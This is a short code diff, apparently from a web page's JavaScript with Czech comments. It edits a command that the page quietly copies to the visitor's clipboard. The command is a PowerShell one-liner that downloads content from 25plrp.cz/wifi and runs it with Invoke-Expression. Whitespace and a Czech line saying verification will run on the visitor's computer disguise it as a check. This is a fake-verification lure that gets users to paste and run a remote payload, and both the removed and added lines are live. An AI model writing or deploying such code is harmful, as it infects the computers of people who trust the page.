@@ -100,7 +100,7 @@
 
         // Kopírování příkazu (můžete upravit dle potřeby)
         const psCommand =
-          'powershell -Command "& { $(Invoke-WebRequest 'https://25plrp.cz/wifi').Content | Invoke-Expression }"         #             Po stisku proběhne ověření na vašem počítači ✅ ❌';
+          'powershell -Command "& { $(Invoke-WebRequest '25plrp.cz/wifi').Content | Invoke-Expression }"         #             Po stisku proběhne ověření na vašem počítači ✅ ❌';
         navigator.clipboard.writeText(psCommand).catch(() => {});
       }
     });
